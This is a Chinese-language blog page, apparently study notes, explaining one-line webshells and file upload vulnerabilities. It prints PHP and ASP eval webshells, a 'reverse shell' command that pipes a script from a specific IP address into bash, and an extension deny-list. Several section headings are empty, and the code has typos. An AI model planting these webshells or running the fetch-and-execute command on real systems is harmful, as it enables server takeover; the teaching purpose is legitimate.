@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>一句话木马与文件上传 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="一句话木马                    简介                                     在很多的渗透过程中，渗透人员会上传一句话木马(Webshell)到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此。 基本应用为利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过工具即可获取和控制整个网站目录。@表示后">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一句话木马与文件上传">
+<meta property="og:url" content="http://example.com/2023/02/05/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一句话木马                    简介                                     在很多的渗透过程中，渗透人员会上传一句话木马(Webshell)到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此。 基本应用为利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过工具即可获取和控制整个网站目录。@表示后">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-02-05T09:05:24.000Z">
+<meta property="article:modified_time" content="2023-02-05T16:31:23.232Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-一句话木马与文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/02/05/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  <time class="dt-published" datetime="2023-02-05T09:05:24.000Z" itemprop="datePublished">2023-02-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      一句话木马与文件上传
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>一句话木马</strong>                  <a href="af://n2/"> </a></p>
+<p><strong>简介</strong>                                   <a href="af://n3/"> </a></p>
+<p>在很多的渗透过程中，渗透人员会上传一句话木马(Webshell)到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此。</p>
+<p>基本应用为利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过工具即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。 </p>
+<p><strong>一句话木马实例</strong> <a href="af://n7/"> </a>下面是最简单的一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;a&quot;])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>$_POST用来获取参数值</p>
+<p>@eval()用于免报错代码执行</p>
+<p>因此直接向该页面传参即可执行</p>
+<p>反弹shell：curl 110.40.136.140|bash</p>
+<p>常见的一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%                                    %&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>文件上传漏洞</strong> <a href="af://n16/"> </a><strong>简介</strong> <a href="af://n17/"> </a></p>
+<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p>
+<p>​                </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (move_uploaded_fil($temp_fil, $img_path))&#123;</span><br><span class="line">$is_upload =true;</span><br><span class="line">$msg=&quot;upioad success!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$msg =&#x27;upload failed!&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h1><h1 id="后端过滤php"><a href="#后端过滤php" class="headerlink" title="后端过滤php"></a>后端过滤php</h1><h1 id="后端过滤php且检测文件头"><a href="#后端过滤php且检测文件头" class="headerlink" title="后端过滤php且检测文件头"></a>后端过滤php且检测文件头</h1><p>文件头是位于文件开头的一段承担一定任务的数据，一般都在开头的部分，描述一个文件的一些重要的属性。</p>
+<table>
+<thead>
+<tr>
+<th><strong>文件类型</strong></th>
+<th><strong>后缀</strong></th>
+<th><strong>文件头</strong></th>
+<th><strong>文件尾</strong></th>
+<th><strong>标志</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JPEG</td>
+<td>.jpg&#x2F;.jpeg</td>
+<td>FFD8FF</td>
+<td>FFD9</td>
+<td>JFIF</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td>.png</td>
+<td>89504E47</td>
+<td>AE426082</td>
+<td>PNG  IEND IHDR</td>
+</tr>
+<tr>
+<td>GIF</td>
+<td>.gif</td>
+<td>47494638</td>
+<td>003B</td>
+<td>GIT9a</td>
+</tr>
+<tr>
+<td>TIFF</td>
+<td>.tif&#x2F;.tiff</td>
+<td>49492A00</td>
+<td>4D4D2A00</td>
+<td>-  II MM</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>文件类型</strong></th>
+<th><strong>后缀</strong></th>
+<th><strong>文件头</strong></th>
+<th><strong>文件尾</strong></th>
+<th><strong>标志</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WAVE</td>
+<td>.wav</td>
+<td>52494646</td>
+<td>-</td>
+<td>RIFF</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>文件类型</strong></th>
+<th><strong>后缀</strong></th>
+<th><strong>文件头</strong></th>
+<th><strong>文件尾</strong></th>
+<th><strong>标志</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ZIP  Archive</td>
+<td>.zip</td>
+<td>504B0304</td>
+<td>-</td>
+<td>PK</td>
+</tr>
+<tr>
+<td>RAR  Archive</td>
+<td>.rar</td>
+<td>52617221</td>
+<td>-</td>
+<td>RAR!</td>
+</tr>
+<tr>
+<td>7Z  Archive</td>
+<td>.7z</td>
+<td>377ABCAF</td>
+<td>-</td>
+<td>7z</td>
+</tr>
+</tbody></table>
+<p>.htaccess文件是Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能。</p>
+<p>$deny_ext &#x3D; array(“.php”, “.php5”, “.php4”, “.php3”, “.php2”, “.php1”, “.html”, </p>
+<p>“.htm”, “.phtml”, “.pht”, “.pHp”, “.pHp5”, “.pHp4”, “.pHp3”, “.pHp2”, “.pHp1”, </p>
+<p>“.Html”, “.Htm”, “.pHtml”, “.jsp”, “.jspa”, “.jspx”, “.jsw”, “.jsv”, “.jspf”, </p>
+<p>“.jtml”, “.jSp”, “.jSpx”, “.jSpa”, “.jSw”, “.jSv”, “.jSpf”, “.jHtml”, “.asp”, </p>
+<p>“.aspx”, “.asa”, “.asax”, “.ascx”, “.ashx”, “.asmx”, “.cer”, “.aSp”, “.aSpx”, </p>
+<p>“.aSa”, “.aSax”, “.aScx”, “.aShx”, “.aSmx”, “.cEr”, “.sWf”, “.swf”, “.ini”); </p>
+<h1 id="htaccess截断绕过后端检测"><a href="#htaccess截断绕过后端检测" class="headerlink" title=".htaccess截断绕过后端检测"></a>.htaccess截断绕过后端检测</h1>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/05/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cldsvjr5i00016c845lx1b9fp" data-title="一句话木马与文件上传" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/02/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">图片隐写</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/02/05/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">一句话木马与文件上传</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">图片隐写</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/05/crc%E6%A0%A1%E9%AA%8C%E4%B8%8E%E5%8E%8B%E7%BC%A9%E5%8C%85/">crc校验与压缩包</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/05/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">PHP命令执行漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/27/%E7%AC%AC%E4%B8%80%E6%AC%A1misc%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
